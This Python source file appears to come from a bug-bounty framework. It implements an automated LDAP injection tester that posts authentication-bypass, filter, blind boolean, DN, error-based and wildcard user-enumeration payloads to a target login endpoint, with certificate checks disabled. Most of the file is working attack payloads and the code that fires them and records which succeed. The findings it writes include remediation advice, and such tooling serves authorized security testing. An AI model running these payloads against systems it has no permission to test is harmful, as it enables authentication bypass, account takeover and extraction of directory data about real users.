"""
LDAP Injection Tester Agent

Comprehensive LDAP injection testing agent for authentication bypass, filter injection,
blind injection, and attribute enumeration.

Tests for:
- LDAP filter injection
- LDAP authentication bypass
- Blind LDAP injection (boolean-based)
- LDAP attribute enumeration
- DN (Distinguished Name) injection
- Error-based LDAP injection
- LDAP user enumeration
- Wildcard injection attacks

Supports:
- Active Directory
- OpenLDAP
- Apache Directory Server
- IBM Directory Server
- Oracle Internet Directory

Author: BountyHound Team
Version: 1.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import asyncio
import aiohttp
import re
import time
import string
import urllib.parse
from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass, field, asdict
from enum import Enum
from datetime import datetime
from colorama import Fore, Style
from engine.core.db_hooks import DatabaseHooks
from engine.core.database import BountyHoundDB
from engine.core.payload_hooks import PayloadHooks



class LDAPType(Enum):
    """LDAP directory server types."""
    ACTIVE_DIRECTORY = "active_directory"
    OPENLDAP = "openldap"
    APACHE_DS = "apache_directory_server"
    IBM_DIRECTORY = "ibm_directory_server"
    ORACLE_DIRECTORY = "oracle_internet_directory"
    UNKNOWN = "unknown"


class InjectionType(Enum):
    """Types of LDAP injection attacks."""
    AUTH_BYPASS = "authentication_bypass"
    FILTER_INJECTION = "filter_injection"
    BLIND_INJECTION = "blind_injection"
    DN_INJECTION = "dn_injection"
    ATTRIBUTE_ENUMERATION = "attribute_enumeration"
    BOOLEAN_INJECTION = "boolean_injection"
    ERROR_BASED = "error_based"
    USER_ENUMERATION = "user_enumeration"


class Severity(Enum):
    """Finding severity levels."""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class LDAPFinding:
    """Represents an LDAP injection vulnerability finding."""
    finding_id: str
    severity: Severity
    title: str
    description: str
    ldap_type: LDAPType
    injection_type: InjectionType
    parameter: str
    payload: str
    evidence: Dict
    impact: str
    remediation: str
    bounty_estimate: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    cwe_id: str = "CWE-90"

    def to_dict(self) -> Dict:
        """Convert finding to dictionary."""
        data = asdict(self)
        data['severity'] = self.severity.value
        data['ldap_type'] = self.ldap_type.value
        data['injection_type'] = self.injection_type.value
        return data


@dataclass
class LDAPInjectionPoint:
    """Represents a detected LDAP injection point."""
    url: str
    parameter: str
    method: str
    vulnerable: bool
    injection_type: Optional[InjectionType]
    payloads: List[str] = field(default_factory=list)
    confidence: str = "low"  # low, medium, high


class LDAPInjectionTester:
    """
    Comprehensive LDAP Injection Tester.

    Tests for LDAP injection vulnerabilities using multiple techniques:
    - Authentication bypass via filter manipulation
    - Filter injection for data extraction
    - Blind injection (boolean-based)
    - Attribute enumeration
    - DN injection
    - Error-based injection
    - User enumeration via wildcard

    Usage:
        tester = LDAPInjectionTester(target_url="https://example.com/api/login")
        findings = await tester.test_all()
    """

    # Authentication bypass payloads
    AUTH_BYPASS_PAYLOADS = [
        {"username": "*", "password": "*"},
        {"username": "admin*", "password": "*"},
        {"username": "*)(&", "password": "*)(&"},
        {"username": "*)(uid=*))(|(uid=*", "password": "*"},
        {"username": "admin)(&(password=*", "password": "*"},
        {"username": "*)(|(password=*", "password": "anything"},
        {"username": "admin)(|(password=*", "password": "test"},
        {"username": "*))%00", "password": "anything"},
        {"username": "admin*", "password": "wrongpass)(&(uid=*"},
        {"username": "*)(objectClass=*", "password": "*)(objectClass=*"},
        {"username": "admin))(|(cn=*", "password": "test"},
        {"username": "*)(objectClass=user", "password": "*"},
    ]

    # Filter injection payloads
    FILTER_PAYLOADS = [
        "*",
        ")(cn=*",
        "*(|(objectClass=*",
        ")(&(objectClass=*",
        "*)(uid=*))(&(uid=*",
        "admin))(|(cn=*",
        "*)(|(mail=*",
        ")(cn=admin)",
        "*)(description=*",
        "*)(&(cn=*)(cn=*",
        ")(sn=*",
        "*)(telephoneNumber=*",
    ]

    # Boolean-based blind injection payloads
    BOOLEAN_PAYLOADS = [
        ("admin*)(&(objectClass=*)(objectClass=*", True),  # Always true
        ("admin*)(&(objectClass=void)(objectClass=void", False),  # Always false
        ("admin*)(|(cn=*)(cn=*", True),  # OR true
        ("admin*)(|(cn=void)(cn=void", False),  # OR false
    ]

    # LDAP special characters to test
    SPECIAL_CHARS = ["*", "(", ")", "\\", "/", "&", "|", "!", "=", "~", ">", "<"]

    # Common LDAP attributes
    LDAP_ATTRIBUTES = [
        "uid", "cn", "sn", "mail", "userPassword", "objectClass",
        "dn", "distinguishedName", "sAMAccountName", "memberOf",
        "description", "telephoneNumber", "givenName", "displayName",
        "userPrincipalName", "employeeNumber", "department"
    ]

    # Common usernames for enumeration
    COMMON_USERNAMES = [
        "admin", "administrator", "root", "test", "user", "guest",
        "service", "system", "backup", "support", "helpdesk"
    ]

    # LDAP error indicators
    LDAP_ERROR_INDICATORS = [
        "LDAP", "ldap_bind", "ldap_search", "ldap_add", "ldap_modify",
        "javax.naming.directory", "com.sun.jndi.ldap", "LdapException",
        "InvalidSearchFilterException", "NamingException",
        "Active Directory", "distinguished name", "objectClass",
        "LDAP_INVALID_CREDENTIALS", "LDAP_OPERATIONS_ERROR",
        "LDAP_INVALID_SYNTAX", "LDAP_FILTER_ERROR", "filter syntax"
    ]

    def __init__(self, target_url: str, target: Optional[str] = None,
                 timeout: int = 10, max_concurrent: int = 5):
        """
        Initialize LDAP injection tester.

        Args:
            target_url: Target URL to test (e.g., https://example.com/api/login)
            target: Target identifier for database tracking (default: extracted from URL)
            timeout: Request timeout in seconds
            max_concurrent: Maximum concurrent requests
        """
        self.target_url = target_url
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.findings: List[LDAPFinding] = []
        self.injection_points: List[LDAPInjectionPoint] = []
        self.ldap_type = LDAPType.UNKNOWN
        self.enumerated_users: Set[str] = set()
        self.enumerated_attributes: Dict[str, List[str]] = {}
        self.baseline_response: Optional[str] = None
        self.baseline_status: Optional[int] = None

        # Extract domain from URL for database tracking
        if target:
            self.target = target
        else:
            parsed = urllib.parse.urlparse(target_url)
            self.target = parsed.netloc or "unknown-target"

        # Test statistics
        self.tests_run = 0
        self.tests_passed = 0
        self.start_time = time.time()

    async def test_all(self) -> List[LDAPFinding]:
        """
        Execute all LDAP injection tests.

        Returns:
            List of LDAP findings
        """
        # Database check
        print(f"{Fore.CYAN}[DATABASE] Checking history for {self.target}...{Style.RESET_ALL}")
        context = DatabaseHooks.before_test(self.target, 'ldap_injection_tester')

        if context['should_skip']:
            print(f"{Fore.YELLOW}[SKIP] {context['reason']}{Style.RESET_ALL}")
            if context.get('previous_findings'):
                print(f"Previous findings: {len(context['previous_findings'])}")
            return []
        else:
            print(f"{Fore.GREEN}[OK] {context['reason']}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[*] Starting LDAP injection testing for {self.target}{Style.RESET_ALL}")
        print(f"[*] Target URL: {self.target_url}")
        print(f"[*] Timeout: {self.timeout}s")
        print(f"[*] Max concurrent: {self.max_concurrent}")

        # Establish baseline
        await self._establish_baseline()

        # Detect LDAP backend
        await self._detect_ldap()

        # Run all test phases
        await self._test_auth_bypass()
        await self._test_filter_injection()
        await self._test_blind_injection()
        await self._test_attribute_enumeration()
        await self._test_dn_injection()
        await self._test_error_based()
        await self._test_user_enumeration()

        # Record results in database
        duration = int(time.time() - self.start_time)
        db = BountyHoundDB()
        db.record_tool_run(
            self.target,
            'ldap_injection_tester',
            findings_count=len(self.findings),
            duration_seconds=duration,
            success=True
        )

        # Record successful payloads
        for finding in self.findings:
            if finding.severity in [Severity.CRITICAL, Severity.HIGH]:
                PayloadHooks.record_payload_success(
                    payload_text=finding.payload,
                    vuln_type='LDAP Injection',
                    context=finding.injection_type.value,
                    notes=finding.title
                )

        # Print summary
        self._print_summary()

        return self.findings

    async def _establish_baseline(self):
        """Establish baseline response for comparison."""
        print(f"\n{Fore.YELLOW}[*] Establishing baseline response...{Style.RESET_ALL}")

        async with aiohttp.ClientSession() as session:
            payload = {
                "username": "nonexistent_user_xyz_12345",
                "password": "wrongpassword_xyz_12345"
            }

            try:
                async with session.post(
                    self.target_url,
                    json=payload,
                    timeout=self.timeout,
                    ssl=False
                ) as response:
                    self.baseline_response = await response.text()
                    self.baseline_status = response.status
                    print(f"[+] Baseline established (status: {response.status}, length: {len(self.baseline_response)})")
            except Exception as e:
                print(f"[!] Could not establish baseline: {e}")

    async def _detect_ldap(self):
        """Detect LDAP backend and version."""
        print(f"\n{Fore.YELLOW}[*] Detecting LDAP backend...{Style.RESET_ALL}")

        async with aiohttp.ClientSession() as session:
            # Test with special LDAP characters
            test_chars = ["*", "(", ")", "\\", "|", "&"]

            for char in test_chars:
                try:
                    payload = {"username": f"admin{char}", "password": "test"}
                    async with session.post(
                        self.target_url,
                        json=payload,
                        timeout=self.timeout,
                        ssl=False
                    ) as response:
                        text = await response.text()

                        # Check for LDAP-specific error messages
                        if any(indicator in text for indicator in self.LDAP_ERROR_INDICATORS):
                            print(f"{Fore.GREEN}[+] LDAP backend detected{Style.RESET_ALL}")
                            self._identify_ldap_type(text)
                            return True
                except:
                    pass

        print(f"{Fore.YELLOW}[*] No explicit LDAP backend detected (proceeding with tests){Style.RESET_ALL}")
        return False

    def _identify_ldap_type(self, response: str):
        """Identify specific LDAP implementation."""
        if "Active Directory" in response or "sAMAccountName" in response or "userPrincipalName" in response:
            self.ldap_type = LDAPType.ACTIVE_DIRECTORY
            print(f"{Fore.GREEN}[+] Identified: Active Directory{Style.RESET_ALL}")
        elif "OpenLDAP" in response:
            self.ldap_type = LDAPType.OPENLDAP
            print(f"{Fore.GREEN}[+] Identified: OpenLDAP{Style.RESET_ALL}")
        elif "ApacheDS" in response or "Apache Directory" in response:
            self.ldap_type = LDAPType.APACHE_DS
            print(f"{Fore.GREEN}[+] Identified: Apache Directory Server{Style.RESET_ALL}")
        elif "IBM" in response and "directory" in response.lower():
            self.ldap_type = LDAPType.IBM_DIRECTORY
            print(f"{Fore.GREEN}[+] Identified: IBM Directory Server{Style.RESET_ALL}")
        elif "Oracle" in response and "directory" in response.lower():
            self.ldap_type = LDAPType.ORACLE_DIRECTORY
            print(f"{Fore.GREEN}[+] Identified: Oracle Internet Directory{Style.RESET_ALL}")

    async def _test_auth_bypass(self):
        """Test LDAP authentication bypass."""
        print(f"\n{Fore.YELLOW}[*] Testing LDAP authentication bypass...{Style.RESET_ALL}")

        async with aiohttp.ClientSession() as session:
            tasks = []
            for payload in self.AUTH_BYPASS_PAYLOADS:
                task = self._test_auth_bypass_payload(session, payload)
                tasks.append(task)

            # Run with concurrency limit
            for i in range(0, len(tasks), self.max_concurrent):
                batch = tasks[i:i + self.max_concurrent]
                await asyncio.gather(*batch)

    async def _test_auth_bypass_payload(self, session: aiohttp.ClientSession, payload: Dict):
        """Test a specific authentication bypass payload."""
        self.tests_run += 1

        try:
            async with session.post(
                self.target_url,
                json=payload,
                timeout=self.timeout,
                ssl=False
            ) as response:
                text = await response.text()
                headers = dict(response.headers)
                status = response.status

                # Check for successful authentication
                success_indicators = [
                    status == 200 and "error" not in text.lower() and "invalid" not in text.lower() and "fail" not in text.lower(),
                    "token" in text.lower() and "error" not in text.lower(),
                    "session" in text.lower() and "invalid" not in text.lower(),
                    "Set-Cookie" in headers and status == 200,
                    "logged in" in text.lower(),
                    "welcome" in text.lower(),
                    "dashboard" in text.lower(),
                    "success" in text.lower() and "login" in text.lower(),
                ]

                # Compare with baseline
                is_different = (
                    text != self.baseline_response or
                    status != self.baseline_status
                )

                if any(success_indicators) and is_different:
                    finding = LDAPFinding(
                        finding_id=f"LDAP-AUTH-{len(self.findings)+1}",
                        severity=Severity.CRITICAL,
                        title="LDAP Authentication Bypass",
                        description=(
                            f"LDAP authentication can be bypassed using filter injection in login credentials. "
                            f"The payload {payload} successfully authenticated without valid credentials."
                        ),
                        ldap_type=self.ldap_type,
                        injection_type=InjectionType.AUTH_BYPASS,
                        parameter="username/password",
                        payload=str(payload),
                        evidence={
                            "payload": payload,
                            "response_status": status,
                            "response_snippet": text[:500],
                            "success_indicators": [ind for ind in success_indicators if ind],
                            "baseline_status": self.baseline_status,
                            "baseline_length": len(self.baseline_response) if self.baseline_response else 0,
                            "response_length": len(text)
                        },
                        impact=(
                            "Attackers can bypass authentication and gain unauthorized access to any user account "
                            "without knowing valid credentials. This allows complete account takeover and access "
                            "to sensitive data and functionality."
                        ),
                        remediation=(
                            "1. Use parameterized LDAP queries or prepared statements\n"
                            "2. Escape special LDAP characters: * ( ) \\ / & | ! = ~ > <\n"
                            "3. Validate input against allowed character sets (alphanumeric only)\n"
                            "4. Implement proper input sanitization before LDAP query construction\n"
                            "5. Use allowlists instead of blocklists for input validation"
                        ),
                        bounty_estimate="$3000-$8000"
                    )
                    self.findings.append(finding)
                    self.tests_passed += 1
                    print(f"{Fore.RED}[!] CRITICAL: Auth bypass found with payload: {payload}{Style.RESET_ALL}")

        except asyncio.TimeoutError:
            pass
        except Exception as e:
            pass

    async def _test_filter_injection(self):
        """Test LDAP filter injection."""
        print(f"\n{Fore.YELLOW}[*] Testing LDAP filter injection...{Style.RESET_ALL}")

        async with aiohttp.ClientSession() as session:
            # Test in various parameters
            params = ["username", "search", "query", "email", "uid"]

            for param in params:
                tasks = []
                for payload in self.FILTER_PAYLOADS:
                    task = self._test_filter_injection_payload(session, param, payload)
                    tasks.append(task)

                # Run with concurrency limit
                for i in range(0, len(tasks), self.max_concurrent):
                    batch = tasks[i:i + self.max_concurrent]
                    await asyncio.gather(*batch)

    async def _test_filter_injection_payload(self, session: aiohttp.ClientSession, param: str, payload: str):
        """Test a specific filter injection payload."""
        self.tests_run += 1

        try:
            # Test in JSON body
            json_payload = {param: payload, "password": "test"}
            async with session.post(
                self.target_url,
                json=json_payload,
                timeout=self.timeout,
                ssl=False
            ) as response:
                text = await response.text()
                status = response.status

                # Check for data leakage
                if self._detect_data_leakage(text):
                    finding = LDAPFinding(
                        finding_id=f"LDAP-FILTER-{len(self.findings)+1}",
                        severity=Severity.HIGH,
                        title=f"LDAP Filter Injection in {param}",
                        description=(
                            f"LDAP filter can be manipulated via the '{param}' parameter, allowing "
                            f"unauthorized data extraction. The payload '{payload}' successfully "
                            f"injected into the LDAP filter and returned sensitive data."
                        ),
                        ldap_type=self.ldap_type,
                        injection_type=InjectionType.FILTER_INJECTION,
                        parameter=param,
                        payload=payload,
                        evidence={
                            "payload": payload,
                            "parameter": param,
                            "response_status": status,
                            "response_snippet": text[:500],
                            "data_leaked": True,
                            "response_length": len(text)
                        },
                        impact=(
                            "Attackers can extract user information, enumerate accounts, and access "
                            "sensitive LDAP attributes including emails, names, phone numbers, group "
                            "memberships, and organizational structure."
                        ),
                        remediation=(
                            "1. Use parameterized LDAP queries\n"
                            "2. Escape special characters: * ( ) \\ / & |\n"
                            "3. Validate input against strict allowlists\n"
                            "4. Implement proper access controls on LDAP attributes\n"
                            "5. Sanitize all user input before LDAP filter construction"
                        ),
                        bounty_estimate="$2000-$6000"
                    )
                    self.findings.append(finding)
                    self.tests_passed += 1
                    print(f"{Fore.RED}[!] HIGH: Filter injection in {param} with payload: {payload}{Style.RESET_ALL}")

            # Test in URL parameter
            url_with_param = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
            async with session.get(url_with_param, timeout=self.timeout, ssl=False) as response:
                text = await response.text()

                if self._detect_data_leakage(text):
                    # Similar finding for URL parameter (avoid duplicate)
                    if not any(f.parameter == f"{param}_url" for f in self.findings):
                        self.tests_passed += 1

        except asyncio.TimeoutError:
            pass
        except Exception:
            pass

    def _detect_data_leakage(self, response: str) -> bool:
        """Detect if response contains leaked LDAP data."""
        # Multiple user records
        if re.search(r'(\{[^}]*"(cn|uid|mail|sn)"[^}]*\}[^{]*){2,}', response):
            return True

        # LDAP attributes in JSON
        ldap_attrs_count = sum(1 for attr in ['"cn":', '"uid":', '"mail":', '"sn":', '"dn":',
                                                '"distinguishedName":', '"sAMAccountName":']
                               if attr in response)
        if ldap_attrs_count >= 2:
            return True

        # Multiple email patterns
        email_matches = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', response)
        if len(email_matches) >= 3:
            return True

        # DN patterns
        dn_matches = re.findall(r'(cn|ou|dc)=[^,]+,', response)
        if len(dn_matches) >= 3:
            return True

        # Array of users
        if ('"users":[' in response or '"members":[' in response) and len(response) > 500:
            return True

        return False

    async def _test_blind_injection(self):
        """Test blind LDAP injection."""
        print(f"\n{Fore.YELLOW}[*] Testing blind LDAP injection...{Style.RESET_ALL}")

        await self._test_boolean_blind_injection()

    async def _test_boolean_blind_injection(self):
        """Test boolean-based blind LDAP injection."""
        async with aiohttp.ClientSession() as session:
            for true_condition, expected_true in self.BOOLEAN_PAYLOADS[:2]:  # Test true conditions
                for false_condition, expected_false in self.BOOLEAN_PAYLOADS[2:4]:  # Test false conditions
                    try:
                        # True condition
                        true_payload = {"username": true_condition, "password": "test"}
                        async with session.post(
                            self.target_url,
                            json=true_payload,
                            timeout=self.timeout,
                            ssl=False
                        ) as response:
                            true_response = await response.text()
                            true_status = response.status
                            true_length = len(true_response)

                        # False condition
                        false_payload = {"username": false_condition, "password": "test"}
                        async with session.post(
                            self.target_url,
                            json=false_payload,
                            timeout=self.timeout,
                            ssl=False
                        ) as response:
                            false_response = await response.text()
                            false_status = response.status
                            false_length = len(false_response)

                        # Check for differential response
                        has_differential = (
                            true_response != false_response or
                            true_status != false_status or
                            abs(true_length - false_length) > 50
                        )

                        if has_differential:
                            finding = LDAPFinding(
                                finding_id=f"LDAP-BLIND-{len(self.findings)+1}",
                                severity=Severity.HIGH,
                                title="Blind LDAP Injection via Boolean Condition",
                                description=(
                                    f"LDAP filter injection allows boolean-based blind injection, enabling "
                                    f"data extraction character-by-character. True condition '{true_condition}' "
                                    f"produces different response than false condition '{false_condition}'."
                                ),
                                ldap_type=self.ldap_type,
                                injection_type=InjectionType.BLIND_INJECTION,
                                parameter="username",
                                payload=true_condition,
                                evidence={
                                    "true_payload": true_condition,
                                    "false_payload": false_condition,
                                    "true_status": true_status,
                                    "false_status": false_status,
                                    "true_response_length": true_length,
                                    "false_response_length": false_length,
                                    "differential_detected": True,
                                    "length_difference": abs(true_length - false_length)
                                },
                                impact=(
                                    "Attackers can extract sensitive data character-by-character using boolean "
                                    "conditions. This allows extraction of passwords, sensitive attributes, and "
                                    "user information even when direct data retrieval is not possible."
                                ),
                                remediation=(
                                    "1. Sanitize LDAP filter input and escape special characters\n"
                                    "2. Disable verbose error messages in production\n"
                                    "3. Implement consistent error responses (same length, status)\n"
                                    "4. Use parameterized queries to prevent filter manipulation\n"
                                    "5. Monitor for automated enumeration attempts"
                                ),
                                bounty_estimate="$2000-$5000"
                            )
                            self.findings.append(finding)
                            self.tests_passed += 1
                            print(f"{Fore.RED}[!] HIGH: Blind LDAP injection detected{Style.RESET_ALL}")
                            return  # Found one, no need to test more

                    except asyncio.TimeoutError:
                        pass
                    except Exception:
                        pass

    async def _test_attribute_enumeration(self):
        """Test LDAP attribute enumeration."""
        print(f"\n{Fore.YELLOW}[*] Testing attribute enumeration...{Style.RESET_ALL}")

        async with aiohttp.ClientSession() as session:
            tasks = []
            for attr in self.LDAP_ATTRIBUTES:
                task = self._test_attribute(session, attr)
                tasks.append(task)

            # Run with concurrency limit
            for i in range(0, len(tasks), self.max_concurrent):
                batch = tasks[i:i + self.max_concurrent]
                await asyncio.gather(*batch)

        if self.enumerated_attributes:
            finding = LDAPFinding(
                finding_id=f"LDAP-ATTR-{len(self.findings)+1}",
                severity=Severity.HIGH,
                title="LDAP Attribute Enumeration",
                description=(
                    f"Sensitive LDAP attributes can be enumerated via filter injection. "
                    f"Successfully enumerated {len(self.enumerated_attributes)} attributes: "
                    f"{', '.join(list(self.enumerated_attributes.keys())[:10])}"
                ),
                ldap_type=self.ldap_type,
                injection_type=InjectionType.ATTRIBUTE_ENUMERATION,
                parameter="search",
                payload="*)({attribute}=*",
                evidence={
                    "attributes_found": list(self.enumerated_attributes.keys()),
                    "sample_values": {k: v[:5] for k, v in self.enumerated_attributes.items()},
                    "total_attributes": len(self.enumerated_attributes),
                    "total_values": sum(len(v) for v in self.enumerated_attributes.values())
                },
                impact=(
                    "Attackers can extract sensitive user information including emails, phone numbers, "
                    "organizational structure, group memberships, and potentially passwords. This data "
                    "can be used for targeted phishing, social engineering, or further attacks."
                ),
                remediation=(
                    "1. Implement proper access controls on LDAP attributes\n"
                    "2. Validate search filters and escape special characters\n"
                    "3. Restrict which attributes can be queried by unauthenticated users\n"
                    "4. Use allowlists for searchable attributes\n"
                    "5. Monitor for mass enumeration attempts"
                ),
                bounty_estimate="$1500-$4000"
            )
            self.findings.append(finding)
            self.tests_passed += 1
            print(f"{Fore.RED}[!] HIGH: Attribute enumeration successful ({len(self.enumerated_attributes)} attributes){Style.RESET_ALL}")

    async def _test_attribute(self, session: aiohttp.ClientSession, attr: str):
        """Test if a specific attribute can be enumerated."""
        self.tests_run += 1

        try:
            payload = {"search": f"*)({attr}=*", "password": "test"}
            async with session.post(
                self.target_url,
                json=payload,
                timeout=self.timeout,
                ssl=False
            ) as response:
                text = await response.text()

                # Check if attribute values are leaked
                if attr in text or re.search(rf'"{attr}":\s*"[^"]+"', text):
                    if attr not in self.enumerated_attributes:
                        self.enumerated_attributes[attr] = []

                    # Extract values
                    matches = re.findall(rf'"{attr}":\s*"([^"]+)"', text)
                    if matches:
                        self.enumerated_attributes[attr].extend(matches)
                        print(f"{Fore.GREEN}[+] Enumerated attribute: {attr} ({len(matches)} values){Style.RESET_ALL}")

        except asyncio.TimeoutError:
            pass
        except Exception:
            pass

    async def _test_dn_injection(self):
        """Test Distinguished Name (DN) injection."""
        print(f"\n{Fore.YELLOW}[*] Testing DN injection...{Style.RESET_ALL}")

        dn_payloads = [
            "cn=admin,dc=example,dc=com",
            "cn=admin)(cn=*",
            "cn=*",
            "cn=admin,ou=users,dc=example,dc=com)(cn=*",
            "ou=*",
            "dc=*",
        ]

        async with aiohttp.ClientSession() as session:
            for payload in dn_payloads:
                await self._test_dn_payload(session, payload)

    async def _test_dn_payload(self, session: aiohttp.ClientSession, payload: str):
        """Test a specific DN injection payload."""
        self.tests_run += 1

        try:
            json_payload = {"dn": payload, "password": "test"}
            async with session.post(
                self.target_url,
                json=json_payload,
                timeout=self.timeout,
                ssl=False
            ) as response:
                text = await response.text()
                status = response.status

                # Check for successful injection or data leakage
                dn_indicators = ["objectClass", "ou=", "dc=", "cn=", "distinguishedName", "organizationalUnit"]

                if any(indicator in text for indicator in dn_indicators) or self._detect_data_leakage(text):
                    finding = LDAPFinding(
                        finding_id=f"LDAP-DN-{len(self.findings)+1}",
                        severity=Severity.HIGH,
                        title="LDAP DN Injection",
                        description=(
                            f"Distinguished Name can be manipulated to access unauthorized resources. "
                            f"The payload '{payload}' successfully injected into DN parameter."
                        ),
                        ldap_type=self.ldap_type,
                        injection_type=InjectionType.DN_INJECTION,
                        parameter="dn",
                        payload=payload,
                        evidence={
                            "payload": payload,
                            "response_status": status,
                            "response_snippet": text[:500],
                            "indicators_found": [ind for ind in dn_indicators if ind in text]
                        },
                        impact=(
                            "Attackers can access resources in different organizational units or domains. "
                            "This may allow privilege escalation or access to sensitive data in other "
                            "parts of the directory structure."
                        ),
                        remediation=(
                            "1. Validate DN format strictly\n"
                            "2. Restrict access to authorized DNs only\n"
                            "3. Use allowlists for valid organizational units\n"
                            "4. Escape special LDAP DN characters\n"
                            "5. Implement proper access controls on directory structure"
                        ),
                        bounty_estimate="$1500-$4000"
                    )
                    self.findings.append(finding)
                    self.tests_passed += 1
                    print(f"{Fore.RED}[!] HIGH: DN injection found with payload: {payload}{Style.RESET_ALL}")

        except asyncio.TimeoutError:
            pass
        except Exception:
            pass

    async def _test_error_based(self):
        """Test error-based LDAP injection."""
        print(f"\n{Fore.YELLOW}[*] Testing error-based injection...{Style.RESET_ALL}")

        # Payloads designed to trigger LDAP errors
        error_payloads = [
            "(", ")", "(((",  ")))", ")()()()",
            "&&&", "|||", "\\\\\\",
            "admin)(!(&(objectClass=*",
            "admin)(!(objectClass=*",
        ]

        async with aiohttp.ClientSession() as session:
            for payload in error_payloads:
                await self._test_error_payload(session, payload)

    async def _test_error_payload(self, session: aiohttp.ClientSession, payload: str):
        """Test a payload that triggers LDAP errors."""
        self.tests_run += 1

        try:
            json_payload = {"username": payload, "password": "test"}
            async with session.post(
                self.target_url,
                json=json_payload,
                timeout=self.timeout,
                ssl=False
            ) as response:
                text = await response.text()
                status = response.status

                # Check for LDAP error messages
                if any(indicator in text for indicator in self.LDAP_ERROR_INDICATORS):
                    finding = LDAPFinding(
                        finding_id=f"LDAP-ERROR-{len(self.findings)+1}",
                        severity=Severity.MEDIUM,
                        title="LDAP Error Message Disclosure",
                        description=(
                            f"Detailed LDAP error messages are exposed, revealing internal structure. "
                            f"The payload '{payload}' triggered LDAP error disclosure."
                        ),
                        ldap_type=self.ldap_type,
                        injection_type=InjectionType.ERROR_BASED,
                        parameter="username",
                        payload=payload,
                        evidence={
                            "payload": payload,
                            "response_status": status,
                            "error_message": text[:500],
                            "indicators_found": [ind for ind in self.LDAP_ERROR_INDICATORS if ind in text]
                        },
                        impact=(
                            "Error messages reveal LDAP structure, filter syntax, implementation details, "
                            "and internal paths. This information aids attackers in crafting more targeted "
                            "LDAP injection attacks."
                        ),
                        remediation=(
                            "1. Disable detailed error messages in production\n"
                            "2. Use generic error responses for LDAP failures\n"
                            "3. Log detailed errors server-side only\n"
                            "4. Implement custom error handling for LDAP operations\n"
                            "5. Never expose stack traces or internal paths"
                        ),
                        bounty_estimate="$500-$1500"
                    )
                    self.findings.append(finding)
                    self.tests_passed += 1
                    print(f"{Fore.YELLOW}[!] MEDIUM: LDAP error disclosure with payload: {payload}{Style.RESET_ALL}")

        except asyncio.TimeoutError:
            pass
        except Exception:
            pass

    async def _test_user_enumeration(self):
        """Enumerate valid usernames via wildcard injection."""
        print(f"\n{Fore.YELLOW}[*] Testing user enumeration...{Style.RESET_ALL}")

        async with aiohttp.ClientSession() as session:
            for username in self.COMMON_USERNAMES:
                await self._test_username_exists(session, username)

        if self.enumerated_users:
            finding = LDAPFinding(
                finding_id=f"LDAP-ENUM-{len(self.findings)+1}",
                severity=Severity.MEDIUM,
                title="LDAP User Enumeration via Wildcard",
                description=(
                    f"Valid usernames can be enumerated using LDAP wildcard injection. "
                    f"Successfully enumerated {len(self.enumerated_users)} valid users: "
                    f"{', '.join(list(self.enumerated_users)[:10])}"
                ),
                ldap_type=self.ldap_type,
                injection_type=InjectionType.USER_ENUMERATION,
                parameter="username",
                payload="username*",
                evidence={
                    "enumerated_users": list(self.enumerated_users),
                    "total_users": len(self.enumerated_users),
                    "method": "wildcard_injection"
                },
                impact=(
                    "Attackers can enumerate valid usernames for targeted attacks, credential "
                    "stuffing, password spraying, or social engineering campaigns."
                ),
                remediation=(
                    "1. Return consistent error messages for both valid and invalid usernames\n"
                    "2. Implement rate limiting on login attempts\n"
                    "3. Use same response time for valid and invalid users\n"
                    "4. Consider using email addresses instead of usernames\n"
                    "5. Monitor for enumeration attempts"
                ),
                bounty_estimate="$500-$1500"
            )
            self.findings.append(finding)
            self.tests_passed += 1
            print(f"{Fore.YELLOW}[!] MEDIUM: User enumeration successful ({len(self.enumerated_users)} users){Style.RESET_ALL}")

    async def _test_username_exists(self, session: aiohttp.ClientSession, username: str):
        """Test if a username exists via differential response."""
        self.tests_run += 1

        try:
            # Test with wildcard
            payload = {"username": f"{username}*", "password": "test"}
            async with session.post(
                self.target_url,
                json=payload,
                timeout=self.timeout,
                ssl=False
            ) as response:
                text = await response.text()
                status = response.status

                # Compare with baseline (non-existent user)
                if self.baseline_response and (
                    text != self.baseline_response or
                    status != self.baseline_status or
                    abs(len(text) - len(self.baseline_response)) > 50
                ):
                    self.enumerated_users.add(username)
                    print(f"{Fore.GREEN}[+] Found valid user: {username}{Style.RESET_ALL}")

        except asyncio.TimeoutError:
            pass
        except Exception:
            pass

    def _print_summary(self):
        """Print test summary."""
        duration = int(time.time() - self.start_time)

        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}LDAP INJECTION TESTING COMPLETE{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"Target: {self.target_url}")
        print(f"LDAP Type: {self.ldap_type.value}")
        print(f"Tests run: {self.tests_run}")
        print(f"Tests passed: {self.tests_passed}")
        print(f"Duration: {duration}s")
        print(f"Total findings: {len(self.findings)}")

        if self.enumerated_users:
            print(f"Enumerated users: {len(self.enumerated_users)}")
        if self.enumerated_attributes:
            print(f"Enumerated attributes: {len(self.enumerated_attributes)}")

        if self.findings:
            print(f"\n{Fore.RED}FINDINGS BY SEVERITY:{Style.RESET_ALL}")

            # Group by severity
            by_severity = {}
            for finding in self.findings:
                sev = finding.severity.value
                if sev not in by_severity:
                    by_severity[sev] = []
                by_severity[sev].append(finding)

            # Print by severity
            for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
                if severity in by_severity:
                    findings = by_severity[severity]
                    color = Fore.RED if severity == 'CRITICAL' else Fore.YELLOW if severity in ['HIGH', 'MEDIUM'] else Fore.CYAN
                    print(f"\n{color}{severity}: {len(findings)}{Style.RESET_ALL}")
                    for f in findings:
                        print(f"  - {f.title}")
